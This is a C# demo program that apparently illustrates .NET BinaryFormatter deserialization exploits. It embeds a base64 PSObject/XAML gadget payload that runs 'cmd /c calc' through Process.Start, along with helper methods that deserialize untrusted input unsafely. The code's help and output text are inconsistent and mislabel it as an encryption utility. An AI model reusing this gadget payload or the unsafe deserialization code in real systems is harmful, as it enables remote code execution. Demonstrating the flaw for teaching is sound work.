using System;
using System.Collections.Generic;
using System.IO;
//using System.Management.Automation;
using System.Runtime.Serialization.Formatters.Binary;

using CommandLine;

namespace BinaryFormatterVunerabilities
{
    using Extensions;

    static class Program
    {
        static void Main(string[] args)
        {
            try
            {
                if (args.Length == 1)
                {
                    Help();
                }

                Parser.Default.ParseArguments<Options>(args)
                  .WithParsed<Options>(opts => RunOptionsAndReturnExitCode(opts))
                  .WithNotParsed<Options>((errs) => ParseError(errs));
            }
            catch(Exception ex)
            {
                Console.WriteLine(ex.ToString());
            }
        }

        private static void RunOptionsAndReturnExitCode(Options options)
        {
            if(!string.IsNullOrWhiteSpace(options.Serialize))
            {
                Console.WriteLine("\nEncrypted Value:");
                return;
            }

            if (!string.IsNullOrWhiteSpace(options.Deserialize))
            {
                Console.WriteLine("\nDecrypted Value:");
            }

            if (!string.IsNullOrWhiteSpace(options.Exploit))
            {
                Console.WriteLine($"\nExploit: Decrypting value: {options.Exploit}");
            }

            if (options.Test)
            {
                //JustBinaryFormatter();

                JustBinaryFormatterWithString();

                const string strSomeFile = "AAEAAAD/////AQAAAAAAAAAMAgAAAEdPcmNhQ3J5cHRvZ3JhcGh5LCBWZXJzaW9uPTEuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49bnVsbAUBAAAANVN0YXJidWNrcy5QbGF0Zm9ybS5TZWN1cml0eS5PcmNhQ3J5cHRvZ3JhcGh5LlNvbWVGaWxlAAAAAAIAAAAL";

                //string strSomeFile = SerializeToString(new SomeFile());


            }
        }

        private static void JustBinaryFormatterWithString()
        {
            //const string strSomeFile = "AAEAAAD/////AQAAAAAAAAAMAgAAAEdPcmNhQ3J5cHRvZ3JhcGh5LCBWZXJzaW9uPTEuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49bnVsbAUBAAAANVN0YXJidWNrcy5QbGF0Zm9ybS5TZWN1cml0eS5PcmNhQ3J5cHRvZ3JhcGh5LlNvbWVGaWxlAAAAAAIAAAAL";
            const string strSomeFile = "AAEAAAD/////AQAAAAAAAAAMAgAAAF9TeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLCBWZXJzaW9uPTYuMC40LjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49MzFiZjM4NTZhZDM2NGUzNQUBAAAAJVN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNPYmplY3QBAAAABkNsaVhtbAECAAAABgMAAAD/FA0KPE9ianMgVmVyc2lvbj0iMS4xLjAuMSIgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vcG93ZXJzaGVsbC8yMDA0LzA0Ij4mI3hEOw0KPE9iaiBSZWZJZD0iMCI+JiN4RDsNCiAgICA8VE4gUmVmSWQ9IjAiPiYjeEQ7DQogICAgICA8VD5NaWNyb3NvZnQuTWFuYWdlbWVudC5JbmZyYXN0cnVjdHVyZS5DaW1JbnN0YW5jZSNTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uL1J1bnNwYWNlSW52b2tlNTwvVD4mI3hEOw0KICAgICAgPFQ+TWljcm9zb2Z0Lk1hbmFnZW1lbnQuSW5mcmFzdHJ1Y3R1cmUuQ2ltSW5zdGFuY2UjUnVuc3BhY2VJbnZva2U1PC9UPiYjeEQ7DQogICAgICA8VD5NaWNyb3NvZnQuTWFuYWdlbWVudC5JbmZyYXN0cnVjdHVyZS5DaW1JbnN0YW5jZTwvVD4mI3hEOw0KICAgICAgPFQ+U3lzdGVtLk9iamVjdDwvVD4mI3hEOw0KICAgIDwvVE4+JiN4RDsNCiAgICA8VG9TdHJpbmc+UnVuc3BhY2VJbnZva2U1PC9Ub1N0cmluZz4mI3hEOw0KICAgIDxPYmogUmVmSWQ9IjEiPiYjeEQ7DQogICAgICA8VE5SZWYgUmVmSWQ9IjAiIC8+JiN4RDsNCiAgICAgIDxUb1N0cmluZz5SdW5zcGFjZUludm9rZTU8L1RvU3RyaW5nPiYjeEQ7DQogICAgICA8UHJvcHM+JiN4RDsNCiAgICAgICAgPE5pbCBOPSJQU0NvbXB1dGVyTmFtZSIgLz4mI3hEOw0KCQk8T2JqIE49InRlc3QxIiBSZWZJZCA9IjIwIiA+ICYjeEQ7DQogICAgICAgICAgPFROIFJlZklkPSIxIiA+ICYjeEQ7DQogICAgICAgICAgICA8VD5TeXN0ZW0uV2luZG93cy5NYXJrdXAuWGFtbFJlYWRlcltdLCBQcmVzZW50YXRpb25GcmFtZXdvcmssIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1PC9UPiYjeEQ7DQogICAgICAgICAgICA8VD5TeXN0ZW0uQXJyYXk8L1Q+JiN4RDsNCiAgICAgICAgICAgIDxUPlN5c3RlbS5PYmplY3Q8L1Q+JiN4RDsNCiAgICAgICAgICA8L1ROPiYjeEQ7DQogICAgICAgICAgPExTVD4mI3hEOw0KICAgICAgICAgICAgPFMgTj0iSGFzaCIgPiAgDQoJCSZsdDtSZXNvdXJjZURpY3Rpb25hcnkNCiAgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiINCiAgeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwiDQogIHhtbG5zOlN5c3RlbT0iY2xyLW5hbWVzcGFjZTpTeXN0ZW07YXNzZW1ibHk9bXNjb3JsaWIiDQogIHhtbG5zOkRpYWc9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PXN5c3RlbSImZ3Q7DQoJICZsdDtPYmplY3REYXRhUHJvdmlkZXIgeDpLZXk9IiIgT2JqZWN0VHlwZSA9ICJ7IHg6VHlwZSBEaWFnOlByb2Nlc3N9IiBNZXRob2ROYW1lID0gIlN0YXJ0IiAmZ3Q7DQogICAgICZsdDtPYmplY3REYXRhUHJvdmlkZXIuTWV0aG9kUGFyYW1ldGVycyZndDsNCiAgICAgICAgJmx0O1N5c3RlbTpTdHJpbmcmZ3Q7Y21kJmx0Oy9TeXN0ZW06U3RyaW5nJmd0Ow0KICAgICAgICAmbHQ7U3lzdGVtOlN0cmluZyZndDsiL2MgY2FsYyIgJmx0Oy9TeXN0ZW06U3RyaW5nJmd0Ow0KICAgICAmbHQ7L09iamVjdERhdGFQcm92aWRlci5NZXRob2RQYXJhbWV0ZXJzJmd0Ow0KICAgICZsdDsvT2JqZWN0RGF0YVByb3ZpZGVyJmd0Ow0KJmx0Oy9SZXNvdXJjZURpY3Rpb25hcnkmZ3Q7DQoJCQk8L1M+JiN4RDsNCiAgICAgICAgICA8L0xTVD4mI3hEOw0KICAgICAgICA8L09iaj4mI3hEOw0KICAgICAgPC9Qcm9wcz4mI3hEOw0KICAgICAgPE1TPiYjeEQ7DQogICAgICAgIDxPYmogTj0iX19DbGFzc01ldGFkYXRhIiBSZWZJZCA9IjIiPiAmI3hEOw0KICAgICAgICAgIDxUTiBSZWZJZD0iMSIgPiAmI3hEOw0KICAgICAgICAgICAgPFQ+U3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdDwvVD4mI3hEOw0KICAgICAgICAgICAgPFQ+U3lzdGVtLk9iamVjdDwvVD4mI3hEOw0KICAgICAgICAgIDwvVE4+JiN4RDsNCiAgICAgICAgICA8TFNUPiYjeEQ7DQogICAgICAgICAgICA8T2JqIFJlZklkPSIzIj4gJiN4RDsNCiAgICAgICAgICAgICAgPE1TPiYjeEQ7DQogICAgICAgICAgICAgICAgPFMgTj0iQ2xhc3NOYW1lIj5SdW5zcGFjZUludm9rZTU8L1M+JiN4RDsNCiAgICAgICAgICAgICAgICA8UyBOPSJOYW1lc3BhY2UiPlN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb248L1M+JiN4RDsNCiAgICAgICAgICAgICAgICA8TmlsIE49IlNlcnZlck5hbWUiIC8+JiN4RDsNCiAgICAgICAgICAgICAgICA8STMyIE49Ikhhc2giPjQ2MDkyOTE5MjwvSTMyPiYjeEQ7DQogICAgICAgICAgICAgICAgPFMgTj0iTWlYbWwiPiAmbHQ7Q0xBU1MgTkFNRT0iUnVuc3BhY2VJbnZva2U1IiAmZ3Q7Jmx0O1BST1BFUlRZIE5BTUU9InRlc3QxIiBUWVBFID0ic3RyaW5nIiAmZ3Q7Jmx0Oy9QUk9QRVJUWSZndDsmbHQ7L0NMQVNTJmd0OzwvUz4mI3hEOw0KICAgICAgICAgICAgICA8L01TPiYjeEQ7DQogICAgICAgICAgICA8L09iaj4mI3hEOw0KICAgICAgICAgIDwvTFNUPiYjeEQ7DQogICAgICAgIDwvT2JqPiYjeEQ7DQogICAgICA8L01TPiYjeEQ7DQogICAgPC9PYmo+JiN4RDsNCiAgICA8TVM+JiN4RDsNCiAgICAgIDxSZWYgTj0iX19DbGFzc01ldGFkYXRhIiBSZWZJZCA9IjIiIC8+JiN4RDsNCiAgICA8L01TPiYjeEQ7DQogIDwvT2JqPiYjeEQ7DQo8L09ianM+Cw==";
            MemoryStream ms = strSomeFile.ToMemoryStream();

            // Actual exploit
            //DeserializeFromString<PSObject>(strSomeFile);

            //ProcessExploit(ms.ToArray());

            //IDisposable someFile = ((IDisposable)DeserializeFromStream(ms));
            //someFile.Dispose();
        }

        //private static void JustBinaryFormatter()
        //{
        //    MemoryStream ms = SerializeToStream(new SomeFile());
        //    string strObj = SerializeToString(ms);
        //    Console.WriteLine(strObj);

        //    object objStr = DeserializeFromStream(ms);
        //    Console.WriteLine($"Object deserialized from string to stream: {objStr}");
        //}

        private static void ProcessExploit(byte[] message)
        {
            var bf = new BinaryFormatter();
            SomeFile msg = null;
            try
            {
                using (var ms = new MemoryStream(message))
                {
                    msg = (SomeFile)bf.Deserialize(ms);
                    //msg.Dispose();
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
            }
        }


        private static string SerializeToString<T>(T obj)
        {
            using (var ms = new MemoryStream())
            {
                var formatter = new BinaryFormatter();

                // Obselete for good reason.
#pragma warning disable SYSLIB0011 // Type or member is obsolete
                formatter.Serialize(ms, obj);
#pragma warning restore SYSLIB0011 // Type or member is obsolete

                ms.Position = 0;
                return Convert.ToBase64String(ms.ToArray());
            }
        }

        private static T DeserializeFromString<T>(string strObj)
        {
            byte[] b = Convert.FromBase64String(strObj);
            using (var ms = new MemoryStream(b))
            {
                var formatter = new BinaryFormatter();
                ms.Seek(0, SeekOrigin.Begin);

                // Obselete for good reason.
#pragma warning disable SYSLIB0011 // Type or member is obsolete
                return (T)formatter.Deserialize(ms);
#pragma warning restore SYSLIB0011 // Type or member is obsolete
            }
        }


        private static void ParseError(IEnumerable<Error> errors)
        {
            const string helpText = "Utility to encrypt and decrypt payment method IDs.";
            Console.WriteLine(helpText);
            
            Console.WriteLine(string.Join(Environment.NewLine, errors));
        }

        private static void Help()
        {
            string helpText = $@"Example project to illustrate exploits with BinaryFormatter.\n
            {nameof(BinaryFormatterVunerabilities)}.exe --serialize [value] or --deserialize [value]\n\n";
   
            Console.WriteLine(helpText);
        }



    }
}
